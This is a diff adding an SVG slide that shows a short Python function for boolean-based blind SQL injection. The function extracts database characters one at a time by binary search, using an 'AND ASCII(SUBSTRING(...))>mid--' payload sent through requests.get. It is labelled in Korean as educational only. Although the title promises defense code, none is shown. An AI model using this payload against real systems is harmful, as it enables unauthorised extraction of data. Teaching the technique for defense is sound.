@@ -1,0 +1,39 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="880" height="460" viewBox="0 0 880 460">
+  <rect width="880" height="460" fill="#0a0a0a" rx="12"/>
+
+  <text x="440" y="46" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="22" font-weight="700" fill="#e8e8e8">블라인드 SQLi 탐지 및 방어 코드</text>
+  <text x="440" y="72" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" fill="#888">이진 탐색 추출 시뮬레이션 + 응답 시간 이상 감지</text>
+
+  <rect x="60" y="94" width="760" height="330" rx="8" fill="#000000" stroke="#3a4a6e" stroke-width="1.5"/>
+
+  <text xml:space="preserve" x="80" y="120" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#9aa4b8"># Boolean-based 블라인드 SQLi 이진 탐색 원리</text>
+  <text xml:space="preserve" x="80" y="142" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#7ec8e3" font-weight="600">def</text>
+  <text xml:space="preserve" x="110" y="142" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff"> extract_char_blind(pos: int, target: str) -> str:</text>
+  <text xml:space="preserve" x="80" y="162" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#9aa4b8">    """이진 탐색으로 한 글자의 ASCII 값을 추론"""</text>
+  <text xml:space="preserve" x="80" y="182" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff">    lo, hi = </text>
+  <text xml:space="preserve" x="165" y="182" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#b5cea8">32</text>
+  <text xml:space="preserve" x="183" y="182" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff">, </text>
+  <text xml:space="preserve" x="196" y="182" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#b5cea8">127</text>
+  <text xml:space="preserve" x="80" y="202" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#7ec8e3" font-weight="600">    while</text>
+  <text xml:space="preserve" x="140" y="202" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff"> lo &lt; hi:</text>
+  <text xml:space="preserve" x="80" y="222" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff">        mid = (lo + hi) // </text>
+  <text xml:space="preserve" x="276" y="222" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#b5cea8">2</text>
+  <text xml:space="preserve" x="80" y="242" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#9aa4b8">        # 참이면 200 OK, 거짓이면 404 반환하는 취약 엔드포인트</text>
+  <text xml:space="preserve" x="80" y="262" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff">        payload = </text>
+  <text xml:space="preserve" x="182" y="262" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ce9178">f"1 AND ASCII(SUBSTRING({target},{pos},1))>{mid}--"</text>
+  <text xml:space="preserve" x="80" y="282" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff">        resp = requests.get(url, params={</text>
+  <text xml:space="preserve" x="340" y="282" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ce9178">"id"</text>
+  <text xml:space="preserve" x="376" y="282" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff">: payload})</text>
+  <text xml:space="preserve" x="80" y="302" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#7ec8e3" font-weight="600">        if</text>
+  <text xml:space="preserve" x="115" y="302" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff"> resp.status_code == </text>
+  <text xml:space="preserve" x="278" y="302" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#b5cea8">200</text>
+  <text xml:space="preserve" x="296" y="302" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff">:</text>
+  <text xml:space="preserve" x="80" y="322" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff">            lo = mid + </text>
+  <text xml:space="preserve" x="220" y="322" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#b5cea8">1</text>
+  <text xml:space="preserve" x="80" y="342" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#7ec8e3" font-weight="600">        else</text>
+  <text xml:space="preserve" x="130" y="342" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff">:</text>
+  <text xml:space="preserve" x="80" y="362" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff">            hi = mid</text>
+  <text xml:space="preserve" x="80" y="382" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#7ec8e3" font-weight="600">    return</text>
+  <text xml:space="preserve" x="138" y="382" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff"> chr(lo)</text>
+  <text xml:space="preserve" x="80" y="382" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#9aa4b8">                                   # ↑ 교육 목적 — 실제 사용 금지</text>
+</svg>
